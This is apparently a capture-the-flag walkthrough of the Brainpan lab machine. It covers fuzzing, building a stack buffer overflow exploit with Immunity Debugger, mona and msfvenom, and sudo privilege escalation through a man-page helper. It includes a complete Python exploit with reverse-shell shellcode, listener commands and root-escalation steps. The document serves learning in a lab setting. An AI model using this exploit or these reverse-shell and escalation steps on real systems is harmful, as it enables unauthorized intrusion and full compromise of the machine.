# PORT SCAN
---


| PORT  | SERVICE |
| :---- | :------ |
| 9999  | ABYSS?  |
| 10000 | HTTP    |



# RECONNAISSANCE
---


Since we got a website, we can fuzz at first, this is a `Buffer Overflow` room, so, we need a way to get the file running from behind the port `9999`, let's fuzz first:


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.87.171:10000/FUZZ" -ic -c -t 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.87.171:10000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

bin                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 182ms]
```

Inside of `/bin` we can find this:

![Pasted image 20250531142913.png](../../IMAGES/Pasted%20image%2020250531142913.png)

We got the `brainpan.exe` file, this is the same file running on port `9999`, we can test this by using netcat:


```
nc 10.10.87.171 9999
_|                            _|
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD

                          >> test
                          ACCESS DENIED
```


The `PASSWORD` parameter is vulnerable to buffer overflow, we can test this by locally testing the file inside of a windows vm with immunity debugger and mona, this room is similar to `Buffer Overflow Prep` `Gatekeeper` and the `Brainstorm` machine, the exploitation process is the same, you need to use immunity debugger to exploit the file and get a shell by taking advantage of the buffer overflow, knowing this, we can begin exploitation.


# EXPLOITATION
---

For the sake of the process, I will enumerate the process you need to do in order to craft the exploit and will also provide the exploit at the end if you failed to reproduce any steps, we will need this first:

1. Windows 10 VM.
2. Immunity Debugger
3. Mona


We can install both tools inside of the windows machine, once we got them, we need to do this:


### **Reverse Engineer the Executable**

- Load `brainpan.exe` into **Immunity Debugger** on a **Windows VM**.
- Run a basic **Python script** from Kali (or your host) that connects to port `9999` and sends test data (e.g., the string "password").
- Observe how the application responds to inputs (especially long ones).

### **Trigger the Crash**

- Modify your script to send a long string (like `"A"*600`) and watch Immunity for an **Access Violation**.
- Confirm that the EIP register gets overwritten with `0x41414141` (which is `'A'` in hex), proving it's a **buffer overflow**.

### **Find the EIP Offset**

- Use Metasploit tools:

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

- Replace `"A"*600` in your script with the generated pattern.
- Note the EIP value in Immunity (For example: `35724134`), and find its offset:

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
```

Suppose it returns **524**, then confirm by sending:

```
"A"*524 + "B"*4 + "C"*(600-524-4)
```

### **Check for Bad Characters**

- Generate a byte string of all possible values (`\x01` to `\xff`):

```python
badchars = b"".join([bytes([x]) for x in range(1, 256)])
```

- Inject it after your 524 `A`s and 4-byte padding.
- Use Immunity â†’ **Right-click ESP â†’ Follow in Dump**, and inspect if any bytes are missing or altered.
- Exclude bad chars.

### **Find a JMP ESP Instruction**

- Install and use `mona.py`:

```
!mona modules
```

Look for a module with no memory protections (like DEP, ASLR, etc.).

- Find the `JMP ESP` address in the chosen module:

```
!mona find -s "\xff\xe4" -m brainpan.exe
```

- Suppose the address is `0x311712f3`, convert it to little-endian:


### **Create the Final Exploit Payload**

- Generate shellcode (reverse shell, bind shell, etc.) with `msfvenom`:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 EXITFUNC=thread -b "\x00" -f python
```

Update your script:

```python
padding = b"A" * 524
eip = b"\xf3\x12\x17\x31"
nop_sled = b"\x90" * 16
payload = <your generated shellcode>

buffer = padding + eip + nop_sled + payload
```

### **Test Locally**

- Run the Python exploit while the target is on your Windows VM.
- Start a `nc -lvnp 4444` listener.
- Verify that a reverse shell is received.


### **Exploit the Actual Linux Target**

- Replace the payload with one for Linux (since the remote app runs on a Linux machine):

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
```

- Use the same structure in the script (adjust the shellcode only).
- Run a netcat listener again:

```
nc -lvnp 4444
```

- Send the exploit and you'll get a shell


## Exploit
---

Knowing the steps we need to reproduce in order to get a shell, we can use the following exploit after we've followed everything:

```python
#!/usr/bin/python
import sys
import socket
from time import sleep

# â”€â”€â”€ 1. YOUR SHELLCODE INSERTED HERE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Your msfvenom shellcode goes here as a bytes literal, generate with: 
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

payload = (
    b"\xba\x4c\x84\x2a\x2a\xdb\xde\xd9\x74\x24\xf4\x5e\x2b\xc9"
    b"\xb1\x12\x83\xee\xfc\x31\x56\x0e\x03\x1a\x8a\xc8\xdf\x93"
    b"\x49\xfb\xc3\x80\x2e\x57\x6e\x24\x38\xb6\xde\x4e\xf7\xb9"
    b"\x8c\xd7\xb7\x85\x7f\x67\xfe\x80\x86\x0f\x0b\x7d\x6c\xd3"
    b"\x63\x83\x8e\xfa\x2f\x0a\x6f\x4c\xa9\x5c\x21\xff\x85\x5e"
    b"\x48\x1e\x24\xe0\x18\x88\xd9\xce\xef\x20\x4e\x3e\x3f\xd2"
    b"\xe7\xc9\xdc\x40\xab\x40\xc3\xd4\x40\x9e\x84"
)

# â”€â”€â”€ 2. BUILD THE BUFFER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#
#   [524 "A" bytes] + [4-byte JMP ESP address] + [NOP sled] + [payload]
#
padding  = b"A" * 524

# This 4-byte JMP ESP (little-endian) from mona. Change if yours differs.
eip      = b"\xF3\x12\x17\x31"   # JMP ESP â†’ 0x311712f3

# NOP sled to give the shellcode some landing space
nop_sled = b"\x90" * 32

buffer = padding + eip + nop_sled + payload

# â”€â”€â”€ 3. SET UP TARGET CONNECTION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
host = "10.10.87.171"   # â† change to your Brainpan IP if different
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((host, port))
except Exception as e:
    print(f"[-] Could not connect to {host}:{port} -> {e}")
    sys.exit(1)

# Optional: read any initial banner or prompt
try:
    banner = s.recv(1024)
    print(banner.decode(errors="ignore"))
except:
    pass

# â”€â”€â”€ 4. SEND THE EXPLOIT (PASSWORD) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#
# Brainpan expects a â€œpasswordâ€ line, so append "\r\n" so itâ€™s treated as input.
s.send(buffer + b"\r\n")
print("[+] Exploit buffer sent! The reverse shell should connect back on its own.")

# Give the payload a moment to spawn the shell, then close the socket.
sleep(1)
s.close()
```

Ok, we got the exploit, let's send it and check our listener then:

![Pasted image 20250531145124.png](../../IMAGES/Pasted%20image%2020250531145124.png)

As seen, we get a reverse shell as `puck`, let's proceed with privilege escalation.


# PRIVILEGE ESCALATION
---


We already exploited the `buffer overflow` and got ourselves a shell, since we are dealing with a Linux machine, we can stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250531145244.png](../../IMAGES/Pasted%20image%2020250531145244.png)

Nice, with everything in order, let's check for a PE vector, we can use `linpeas` for that:

![Pasted image 20250531145442.png](../../IMAGES/Pasted%20image%2020250531145442.png)

We can see we got a binary named `anansi_util` on here that we can run as sudo without a password, let's check it out:

```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

The PE vector on this binary is the use of `manual` command, the man command on Linux is used to display the user manual of any command we run on the terminal, the issue on this, is that we can exploit it to get a root as shell, let's refer to `GTFOBINS` to check the PE:

![Pasted image 20250531145755.png](../../IMAGES/Pasted%20image%2020250531145755.png)

So, in order to exploit this, we need to do:

```
sudo /home/anansi/bin/anansi_util manual id # ID CAN BE REPLACED WITH ANY COMMAND.
#!/bin/bash
```

Once we do that, we get:

![Pasted image 20250531145921.png](../../IMAGES/Pasted%20image%2020250531145921.png)

We got a shell as root. Inside of root's directory, we can find `b.txt`:

![Pasted image 20250531150016.png](../../IMAGES/Pasted%20image%2020250531150016.png)

![Pasted image 20250531150056.png](../../IMAGES/Pasted%20image%2020250531150056.png)

